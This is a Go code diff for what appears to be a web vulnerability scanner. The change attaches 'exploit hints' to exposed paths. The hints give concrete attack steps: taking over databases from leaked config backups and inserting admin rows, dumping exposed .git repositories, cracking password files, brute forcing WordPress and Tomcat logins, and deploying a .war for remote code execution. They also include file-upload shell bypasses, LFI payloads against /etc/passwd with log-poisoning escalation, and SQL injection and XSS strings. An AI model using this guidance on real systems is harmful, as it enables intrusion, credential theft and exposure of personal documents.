@@ -198,9 +198,131 @@ var vulnProbes = map[string][]struct {
 	},
 }
 
+// pathIntel — per-path CVE / nuclei-template / exploit-hint enrichment.
+type pathIntel struct {
+	CVEs     []string
+	Nuclei   string
+	Hint     string
+	RefURLs  []string
+}
+
+var pathIntelMap = map[string]pathIntel{
+	"/.env":            {Nuclei: "exposures/configs/dotenv-config-file", Hint: "Pull DB_*, APP_KEY → forge sessions / connect DB directly.", RefURLs: []string{"https://github.com/projectdiscovery/nuclei-templates/blob/main/http/exposures/configs/dotenv-config-file.yaml"}},
+	"/.env.local":      {Nuclei: "exposures/configs/dotenv-config-file", Hint: "Same as .env — Laravel local override often has prod creds."},
+	"/.env.production": {Nuclei: "exposures/configs/dotenv-config-file", Hint: "Production credentials. Test DB host from leaked DB_HOST."},
+	"/.git/config":     {Nuclei: "exposures/configs/git-config", Hint: "Run `git-dumper https://target/.git/ out/` then `git log -p` to extract source + secrets.", RefURLs: []string{"https://github.com/arthaud/git-dumper"}},
+	"/.git/HEAD":       {Nuclei: "exposures/files/git-head", Hint: "Confirm /.git/ exposed → git-dumper for full repo."},
+	"/wp-config.php.bak":   {Nuclei: "exposures/backups/wp-config-bak", CVEs: []string{}, Hint: "DB_NAME/USER/PASSWORD → connect to wp DB → INSERT admin row.", RefURLs: []string{"https://wpscan.com/"}},
+	"/wp-config.php.old":   {Nuclei: "exposures/backups/wp-config-bak", Hint: "Same as .bak — direct DB takeover."},
+	"/wp-config.php~":      {Nuclei: "exposures/backups/wp-config-bak", Hint: "Same — vim/nano left over backup."},
+	"/config.php.bak":      {Hint: "Inspect for DB connection block + admin hashes."},
+	"/configuration.php.bak": {Hint: "Joomla config → $user/$password → MySQL takeover."},
+	"/.htpasswd":         {Nuclei: "exposures/configs/htpasswd-config", Hint: "Run `john --wordlist=rockyou.txt .htpasswd` to crack bcrypt/MD5-crypt."},
+	"/backup.sql":        {Hint: "Grep dump for INSERT INTO users / hashes. Crack with hashcat -m 0/100/1400."},
+	"/dump.sql":          {Hint: "Grep INSERT INTO sessions / users."},
+	"/database.sql":      {Hint: "Same — full DB dump."},
+	"/db_backup.sql":     {Hint: "Same."},
+	"/backup.zip":        {Hint: "Unzip locally; grep -r 'password' ."},
+	"/.DS_Store":         {Nuclei: "exposures/files/ds-store-file", Hint: "Parse with `ds_store_exp` to enum directory contents."},
+	"/composer.json":     {Hint: "Read `require` block to fingerprint vendor lib versions → search CVEs per package."},
+	"/package.json":      {Hint: "Read `dependencies` for npm package versions."},
+
+	"/admin/":             {Nuclei: "default-logins/", Hint: "Try admin:admin, admin:password, admin:admin123. Then sqlmap on login params.", RefURLs: []string{"https://github.com/danielmiessler/SecLists/tree/master/Passwords"}},
+	"/administrator/":     {Nuclei: "technologies/joomla-detect", CVEs: []string{"CVE-2023-23752"}, Hint: "Joomla 4.0.0-4.2.7 unauth API leak: `/api/index.php/v1/config/application?public=true`.", RefURLs: []string{"https://www.cve.org/CVERecord?id=CVE-2023-23752"}},
+	"/wp-admin/":          {Nuclei: "technologies/wordpress-detect", Hint: "Try xmlrpc.php brute, REST user enum, default WP creds."},
+	"/wp-login.php":       {Nuclei: "default-logins/wordpress/wordpress-default-login", Hint: "Brute with wpscan: `wpscan --url X --usernames admin --passwords rockyou.txt`."},
+	"/phpmyadmin/":        {Nuclei: "default-logins/phpmyadmin/phpmyadmin-default-login", CVEs: []string{"CVE-2018-12613", "CVE-2016-5734"}, Hint: "Try root/root, root/empty. LFI via target=... (CVE-2018-12613).", RefURLs: []string{"https://www.cve.org/CVERecord?id=CVE-2018-12613"}},
+	"/pma/":               {Nuclei: "default-logins/phpmyadmin/phpmyadmin-default-login", Hint: "Same as /phpmyadmin/."},
+	"/adminer.php":        {CVEs: []string{"CVE-2021-43008", "CVE-2020-35572"}, Nuclei: "exposures/panels/adminer-panel", Hint: "SSRF via login → connect to internal MySQL. Or upload malicious driver.", RefURLs: []string{"https://www.cve.org/CVERecord?id=CVE-2021-43008"}},
+	"/cpanel/":            {Hint: "cPanel doc link — pivot to https://target:2083/ login. Try default-creds list."},
+	"/manager/html":       {CVEs: []string{"CVE-2017-12617", "CVE-2020-1938"}, Nuclei: "default-logins/tomcat/tomcat-default-login", Hint: "Try tomcat/tomcat, admin/admin. Then deploy .war for RCE.", RefURLs: []string{"https://www.cve.org/CVERecord?id=CVE-2017-12617"}},
+
+	"/uploads/":      {Nuclei: "exposures/configs/apache-config", Hint: "Browse for sensitive uploaded files (PDFs, backups, KTP scans)."},
+	"/files/":        {Hint: "Same — sensitive document leak."},
+	"/backup/":       {Hint: "Look for .sql, .zip, .tar.gz dumps."},
+	"/temp/":         {Hint: "Often contains active session files or partial uploads."},
+	"/.git/":         {Nuclei: "exposures/configs/git-config", Hint: "git-dumper https://target/.git/ ./repo"},
+	"/vendor/":       {Nuclei: "exposures/files/vendor-folder", Hint: "Browse for vendor lib README → fingerprint version → CVE search."},
+	"/node_modules/": {Hint: "Browse for package versions → npm audit equivalent."},
+
+	"/login":      {Hint: "Test default creds, SQLi (' OR 1=1--), user enum via response diff."},
+	"/signin":     {Hint: "Same — default creds + SQLi probe."},
+	"/auth/login": {Hint: "Same."},
+
+	"/readme.html":   {Nuclei: "technologies/wordpress-detect", Hint: "Extract WordPress version → `wpscan --url X --enumerate vp` for vulnerable plugins."},
+	"/CHANGELOG.txt": {CVEs: []string{"CVE-2018-7600", "CVE-2019-6340"}, Nuclei: "vulnerabilities/drupal/drupal-rce", Hint: "Drupal version → if <7.58/<8.5.1: Drupalgeddon 2 RCE.", RefURLs: []string{"https://www.cve.org/CVERecord?id=CVE-2018-7600"}},
+	"/license.txt":   {Hint: "WP license — confirms WordPress install."},
+	"/wp-json/wp/v2/users": {CVEs: []string{"CVE-2017-5487"}, Nuclei: "vulnerabilities/wordpress/wordpress-user-enumeration", Hint: "Enumerate usernames → brute /wp-login.php.", RefURLs: []string{"https://www.cve.org/CVERecord?id=CVE-2017-5487"}},
+	"/_ignition/health-check": {CVEs: []string{"CVE-2021-3129"}, Nuclei: "vulnerabilities/laravel/laravel-ignition-debug-rce", Hint: "If Laravel <8.4.2 + debug=true → unauth RCE via phar://.", RefURLs: []string{"https://www.cve.org/CVERecord?id=CVE-2021-3129"}},
+	"/telescope":     {Nuclei: "exposures/panels/laravel-telescope", Hint: "Browse /telescope/queries → DB queries with bound values (often credentials)."},
+	"/_profiler":     {Nuclei: "exposures/panels/symfony-profiler", Hint: "Symfony profiler → /_profiler/phpinfo, /_profiler/latest. Env vars + DB queries exposed."},
+	"/server-status": {Nuclei: "exposures/apache/apache-server-status", Hint: "Monitor live requests with creds in URLs. `while true; do curl -s X/server-status; sleep 1; done`."},
+	"/phpinfo.php":   {Nuclei: "exposures/files/phpinfo-files", Hint: "Extract env vars (DB_*, secrets), php.ini config, disable_functions list."},
+	"/info.php":      {Nuclei: "exposures/files/phpinfo-files", Hint: "Same as /phpinfo.php."},
+
+	"/upload.php":     {Hint: "Test ext bypass: shell.php.jpg, shell.phtml, .htaccess upload. Check magic-byte filter."},
+	"/fileupload/":    {Hint: "Same upload bypass tests."},
+	"/file-manager/":  {Nuclei: "vulnerabilities/wordpress/wp-file-manager-rce", CVEs: []string{"CVE-2020-25213"}, Hint: "WP File Manager <6.9 RCE via elFinder connector.", RefURLs: []string{"https://www.cve.org/CVERecord?id=CVE-2020-25213"}},
+
+	"/?id=1":                  {Nuclei: "vulnerabilities/generic/sql-injection-error-based", Hint: "Run `sqlmap -u X --batch --dbs --threads=10`."},
+	"/?page=../../../../etc/passwd": {Nuclei: "vulnerabilities/generic/lfi-detection", Hint: "Escalate via /proc/self/environ poisoning + UA shell injection."},
+	"/?file=../../../../etc/passwd": {Nuclei: "vulnerabilities/generic/lfi-detection", Hint: "PHP filter chain: php://filter/convert.base64-encode/resource=index.php"},
+	"/?q=<script>alert(1)</script>": {Nuclei: "vulnerabilities/generic/xss-reflected", Hint: "Bypass WAF: try <svg/onload=>, polyglot payloads, encoded variants."},
+}
+
+// enrichFinding fills in CVE / template / references for a finding based on its path + tech.
+func enrichFinding(f *TargetFinding, tech []string) {
+	if intel, ok := pathIntelMap[f.Path]; ok {
+		f.CVEs = intel.CVEs
+		f.Nuclei = intel.Nuclei
+		f.ExploitHint = intel.Hint
+		f.References = intel.RefURLs
+	}
+	// Always add a cve.org search link
+	q := url.QueryEscape(strings.TrimPrefix(strings.TrimSuffix(f.Path, "/"), "/"))
+	if q == "" {
+		q = url.QueryEscape(f.Title)
+	}
+	f.References = append(f.References,
+		fmt.Sprintf("https://www.cve.org/CVERecord/SearchResults?query=%s", q),
+		fmt.Sprintf("https://www.exploit-db.com/search?q=%s", q),
+	)
+	if f.Nuclei != "" {
+		f.References = append(f.References,
+			fmt.Sprintf("https://github.com/projectdiscovery/nuclei-templates/tree/main/http/%s", f.Nuclei),
+		)
+	}
+	// Tech-based hint additions
+	for _, t := range tech {
+		switch strings.ToLower(t) {
+		case "wordpress":
+			if !contains(f.CVEs, "CVE-2017-5487") && f.Type == "cms" {
+				f.CVEs = append(f.CVEs, "CVE-2017-5487")
+			}
+		case "joomla":
+			if !contains(f.CVEs, "CVE-2023-23752") {
+				f.CVEs = append(f.CVEs, "CVE-2023-23752")
+			}
+		case "drupal":
+			f.CVEs = append(f.CVEs, "CVE-2018-7600", "CVE-2019-6340")
+		case "laravel":
+			f.CVEs = append(f.CVEs, "CVE-2021-3129")
+		}
+	}
+}
+
+func contains(arr []string, s string) bool {
+	for _, a := range arr {
+		if a == s {
+			return true
+		}
+	}
+	return false
+}
+
 // runVulnProbe runs the path checks for selected vuln types in parallel and returns
 // findings (real hits) AND all attempted tests (hit + miss) so the UI can show full work.
-func runVulnProbe(baseURL string, vulnTypes []string) ([]TargetFinding, []ProbeTest) {
+func runVulnProbe(baseURL string, vulnTypes []string, tech []string) ([]TargetFinding, []ProbeTest) {
 	type probe struct {
 		vt      string
 		path    string
@@ -502,10 +624,19 @@ func probeTarget(domain string, vulnTypes []string) probeInfo {
 		if base == "" {
 			base = reqURL
 		}
-		findings, tests := runVulnProbe(base, vulnTypes)
+		findings, tests := runVulnProbe(base, vulnTypes, info.tech)
+		// Enrich each finding with CVE / nuclei-template / refs
+		for i := range findings {
+			enrichFinding(&findings[i], info.tech)
+		}
 		info.findings = findings
 		info.tests = tests
-		info.findings = append(info.findings, checkSecurityHeaders(resp.Header)...)
+		// Security-header findings (no path-based enrichment)
+		hdrFindings := checkSecurityHeaders(resp.Header)
+		for i := range hdrFindings {
+			enrichFinding(&hdrFindings[i], info.tech)
+		}
+		info.findings = append(info.findings, hdrFindings...)
 
 		// Port scan
 		if ip != "" {
